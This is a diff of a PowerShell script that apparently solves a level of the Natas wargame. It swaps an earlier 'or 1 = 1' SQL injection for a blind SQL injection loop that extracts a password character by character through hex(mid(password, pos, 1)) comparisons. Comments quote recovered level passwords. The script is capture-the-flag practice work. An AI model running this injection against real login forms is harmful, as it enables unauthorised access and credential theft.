@@ -80,37 +80,38 @@ $headers = @{ Authorization = "Basic $encodedCreds"}
 
 # --------------------------------------------------------------------------------
 
+$chars = [char[]]"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+$cur = ''
+$parUser = 'natas16" and hex(mid(password, pos, 1)) = hex("xxx") #'
 
 
-$parms = @{"username" = '"union select 1, database() #"'
-        # "username" = '"or 1 = 1 #"'
-        # username="or 1 = 1 #"&password="test"
-            "password" = "test"
+$parms = @{}
+
+$url = $url + "/index.php?debug=true"
+
+foreach($i in 1..32){
+
+    foreach ($c in $chars){
+        $a = $parUser -replace("xxx", $c)
+        $b = $a -replace("pos", $i )
+        # echo $b
+        $parms["username"] = $b
+        # echo $parms
+$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
+$rsp = ($a | select-string -pattern "exists")
+
+            if($rsp.matches.count -gt 0){
+                $cur = $cur + $c
+                    echo $cur
+
+            }
+    }
+
 }
 
-$url = $url + "/index.php?debug=1"
-$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
-
-$a
-
-# <div id="content">
-# Executing query: SELECT * from users where username=""or 1 = 1 #"" and password="test"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
-# </div>
-# </body>
-# </html>
 
 
-#-----------------------------------------------------------------------------------------------------------
+#A better would have been to use "binary like " to get the chars used and then go through them to get the pass
 
 
-# $a = ($a | select-string  -allmatches "(\w{32})") 
-# $b = $a.matches[1].value
-
-
-
-# echo "The password for natas14 is $b"
-
-# PS /home/voltron/OTW/natas/pshell_lang>  
-# ./natas15.ps1                                                                                        
-# The password for natas14 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J                                                                                  
-# PS /home/voltron/OTW/natas/pshell_lang>    
+# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
